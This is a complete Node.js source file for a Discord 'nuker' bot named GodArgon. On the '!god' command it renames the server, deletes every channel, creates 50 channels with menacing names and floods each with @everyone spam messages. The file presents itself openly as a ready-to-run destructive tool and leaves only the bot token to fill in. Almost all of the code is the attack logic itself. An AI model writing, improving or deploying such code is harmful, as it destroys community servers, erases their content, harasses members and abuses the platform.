const { Client, GatewayIntentBits } = require('discord.js');
const chalk = require('chalk');
const { exec } = require('child_process');

// Neon Blue color using chalk.hex
const neonBlueChalk = chalk.hex('#00FFFF'); // Neon Blue (Cyan)

const godArgonPrefix = '!'; // Command prefix
const godArgonToken = ''; // Add your bot token here

const botVersion = '1.0.0'; // Bot version

// Channel names for creation
const godArgonChannelNames = [
    '⚡️ GODARGON: TERMINATION ZONE ⚡️',
    ':fire: SYSTEM CRASHED - GODARGON IS HERE :fire:',
    ':warning: GODARGON IS IN CONTROL - UNLEASH HELL :warning:',
    ':boom: GODARGON STRIKE INCOMING :boom:',
    ':cloud_tornado: GODARGON: TOTAL DEVASTATION :cloud_tornado:',
    ':bomb: GODARGON NUKER ACTIVATED :bomb:',
    ':rotating_light: WARNING: GODARGON ALERT! :rotating_light:',
    '⚡️⚡️ GODARGON CHAOS UNLEASHED ⚡️⚡️',
    ':fire: GODARGON IS INFILTRATING NOW :fire:',
    ':crossed_swords: GODARGON ARMAGEDDON TRIGGERED :crossed_swords:'
];

// Server names
const godArgonServerNames = [
    'GODARGON TERMINATION MODE',
    'GODARGON CHAOS STATE',
    'GODARGON FINAL STAGE',
    'GODARGON END OF DAYS'
];

// Spam messages
const godArgonSpamMessages = [
    `@everyone **\`\`\`:warning: GODARGON IS HERE TO DESTROY! :warning:\`\`\`**\n**:boom: SYSTEM MALFUNCTION! ALL CHANNELS COMPROMISED!**`,
    `@everyone **\`\`\`:fire: GODARGON NUKER IS ACTIVE! :fire:\`\`\`**\n**:rotating_light: GET READY FOR FULL ANNIHILATION!**`,
    `@everyone **\`\`\`:boom: SYSTEM OUTAGE - GODARGON HAS INITIATED! :boom:\`\`\`**\n**:cloud_tornado: COMPLETE DESTRUCTION MODE ENGAGED!**`,
    `@everyone **\`\`\`:rotating_light: GODARGON IS LOOSE! NUKER ENGAGED! :rotating_light:\`\`\`**\n**:fire: WE'RE GOING DOWN - NO ESCAPE!**`
];

// Delay function
const godArgonDelay = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Create the client
const godArgonClient = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildInvites
    ]
});

// Update console visuals
exec("cls && title GodArgon && mode 100,30");

// Bot ready event
godArgonClient.once('ready', () => {
    console.log(neonBlueChalk.bold(`
        [ COMMAND ] - ${godArgonPrefix}god
        BOT ONLINE: ${godArgonClient.user.tag}
        Version: ${botVersion}`));

    godArgonClient.user.setActivity(`The end by GodArgon | Version ${botVersion}`, { type: 3 });
});

// Channel creation logic
async function godArgonCreateChannels(guild, numberOfChannels) {
    const godArgonPromises = Array.from({ length: numberOfChannels }).map(() =>
        guild.channels.create({
            name: godArgonChannelNames[Math.floor(Math.random() * godArgonChannelNames.length)],
            type: 0
        })
    );

    return Promise.all(godArgonPromises);
}

// Command handling
godArgonClient.on('messageCreate', async (message) => {
    if (!message.content.startsWith(godArgonPrefix) || message.author.bot) return;

    const args = message.content.slice(godArgonPrefix.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    if (command === 'god') {
        const option = parseInt(args[0]) - 1;
        const godArgonServerName = godArgonServerNames[option] || godArgonServerNames[0];

        try {
            // Change server name
            await message.guild.setName(godArgonServerName);

            // Fetch and delete all channels
            const godArgonChannels = await message.guild.channels.fetch();
            await Promise.all(godArgonChannels.map(channel => channel.delete()));

            console.log(neonBlueChalk('Deleted all channels. Creating new channels...'));
            await godArgonCreateChannels(message.guild, 50); // Fixed channel count to 50

            console.log(neonBlueChalk('Nuke operation completed!'));
        } catch (error) {
            console.error(`Error executing command: ${error}`);
        }
    }
});

// Handle channel creation
godArgonClient.on('channelCreate', async (channel) => {
    const godArgonSpamIndex = Math.floor(Math.random() * godArgonSpamMessages.length);
    const godArgonSpamMessage = godArgonSpamMessages[godArgonSpamIndex];

    try {
        const permissions = channel.permissionsFor(godArgonClient.user);
        if (channel && permissions && permissions.has('SEND_MESSAGES')) {
            for (let i = 0; i < 20; i++) { // Adjusted spam messages count
                await channel.send(godArgonSpamMessage);
                await godArgonDelay(50); // Fixed 50ms delay
            }

            console.log(neonBlueChalk(`Spam completed in channel: ${channel.name}`));
        } else {
            console.log(`No permission to send messages in channel: ${channel.name}`);
        }
    } catch (error) {
        console.error(`Error sending spam: ${error}`);
    }
});

// Login bot
godArgonClient.login(godArgonToken);
